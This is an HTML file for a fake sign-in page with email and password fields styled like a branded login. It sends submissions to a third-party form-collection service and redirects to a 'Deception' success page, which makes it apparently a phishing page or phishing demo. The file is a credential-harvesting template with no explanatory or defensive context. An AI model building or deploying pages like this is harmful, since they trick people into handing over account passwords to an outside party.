<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>Hello Cruel World!</title>
</head>
<body>
    <form action="https://getsimpleform.com/messages?form_api_token=784af0d3130bba04f2826518fac8c39d" method="post">
      <div class="form-container">
        <div class="text-field-input-wrapper">
            <input dir="ltr" id="user-text-field" class="form-component" autocomplete="username" title="Sign-In ID (Email Address)" tabindex="2" placeholder="Sign-In ID (Email Address)" maxlength="63" type="email">
        </div>
        <div class="text-field-input-wrapper">
          <input id="password-text-field" class="form-component" dir="ltr" autocomplete="current-password" title="Password" tabindex="2" placeholder="Password" maxlength="30" type="password">
        </div>
        <div class="separator-pageitems"></div>
        <div class="columns-center">
            <div class="fitting-width button">
                <button tabindex="2" class="primary-button row-button text-button touch-feedback">
                    <span dir="ltr" class="caption row-button-flex-container">Sign In</span>
                </button>
            </div>
        </div>
        <input type='hidden' name='redirect_to' value='https://2020Deception.github.io/success.html' />
      </div>
    </form>
</body>
</html>
